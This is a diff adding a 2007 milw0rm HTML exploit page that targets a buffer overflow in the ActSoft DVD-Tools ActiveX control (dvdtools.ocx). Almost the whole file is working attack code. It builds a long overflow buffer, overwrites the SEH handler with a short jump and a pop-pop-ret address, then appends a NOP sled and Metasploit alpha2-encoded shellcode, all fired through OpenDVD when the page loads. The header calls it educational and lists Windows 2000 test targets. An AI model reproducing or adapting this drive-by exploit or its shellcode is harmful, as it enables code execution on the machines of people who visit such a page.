@@ -1,0 +1,83 @@
+<!--
+
+  ===============================================================================================
+                        ActSoft DVD-Tools (dvdtools.ocx) Buffer Overflow Exploit
+                                            By Umesh Wanve 
+  ==============================================================================================   
+        
+  Date : 30-03-2007
+ 
+  Tested on Windows 2000 SP4 Server English
+            Windows 2000 SP4 Professional English
+ 
+   
+  PS. This was written for educational purpose. Use it at your own risk.Author will be not be
+      responsible for any damage.
+ 
+  Always thanks to Metasploit and Stroke 
+
+-->
+
+
+
+<html>
+
+<title>
+ ActSoft DVD-Tools (dvdtools.ocx) Buffer Overflow Exploit- By Umesh Wanve
+</title>
+
+<object classid='clsid:894A633E-F261-28BD-96F3-380EBEE1BADE' id='test' ></object>
+
+<script>
+
+var nop=unescape("%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90");
+
+var pointer_to_seh=unescape("%eb%06%90%90");
+
+var seh_handler=unescape("%a9%11%02%75");
+
+
+<!-- win32_exec -  EXITFUNC=seh CMD=calc Size=330 Encoder=Alpha2 http://metasploit.com  -->
+var shellcode= 
+unescape("%eb%03%59%eb%05%e8%f8%ff%ff%ff%49%49%49%49%49%49")+
+unescape("%49%49%49%49%49%49%49%49%49%48%49%49%51%5a%6a%64")+
+unescape("%58%30%41%31%50%42%41%6b%41%41%74%32%41%42%41%32")+
+unescape("%42%41%30%42%41%58%38%41%42%50%75%4a%49%6b%4c%79")+
+unescape("%78%67%34%45%50%43%30%73%30%4c%4b%72%65%55%6c%4c")+
+unescape("%4b%53%4c%53%35%70%78%54%41%7a%4f%6c%4b%72%6f%42")+
+unescape("%38%6e%6b%51%4f%35%70%57%71%7a%4b%43%79%4c%4b%77")+
+unescape("%44%4e%6b%74%41%48%6e%50%31%79%50%6d%49%6e%4c%6b")+
+unescape("%34%6b%70%53%44%76%67%6a%61%4a%6a%44%4d%54%41%5a")+
+unescape("%62%6a%4b%4b%44%37%4b%61%44%71%34%65%54%32%55%58")+
+unescape("%65%6e%6b%63%6f%55%74%34%41%4a%4b%70%66%6e%6b%54")+
+unescape("%4c%70%4b%6e%6b%73%6f%45%4c%76%61%78%6b%6c%4b%55")+
+unescape("%4c%4c%4b%44%41%48%6b%4d%59%73%6c%57%54%75%54%6a")+
+unescape("%63%54%71%4b%70%65%34%6c%4b%37%30%54%70%6c%45%4f")+
+unescape("%30%73%48%54%4c%4e%6b%37%30%74%4c%4c%4b%50%70%67")+
+unescape("%6c%4c%6d%4c%4b%62%48%45%58%38%6b%76%69%6e%6b%4f")+
+unescape("%70%4e%50%45%50%47%70%37%70%6c%4b%32%48%47%4c%51")+
+unescape("%4f%30%31%6b%46%43%50%61%46%6e%69%48%78%6d%53%4f")+
+unescape("%30%61%6b%66%30%31%78%58%70%4d%5a%34%44%61%4f%55")+
+unescape("%38%6e%78%6b%4e%6d%5a%34%4e%73%67%49%6f%6d%37%33")+
+unescape("%53%31%71%70%6c%65%33%45%50%64");
+
+var buff="";
+
+for (i=0;i<432;i++)    buff=buff+"A";
+
+
+<!--   Buffer ------      Short Jump to Shellcode   ----- Pop Pop ret ----  NOP SLED ---- Hellcode --------->
+
+buff = buff         +           pointer_to_seh     +      seh_handler   +  nop+nop    +   shellcode    +nop+nop;
+
+
+var attack = document.getElementById('test');
+
+attack.OpenDVD(buff);
+
+
+</script>
+</body>
+</html>
+
+# milw0rm.com [2007-03-30]
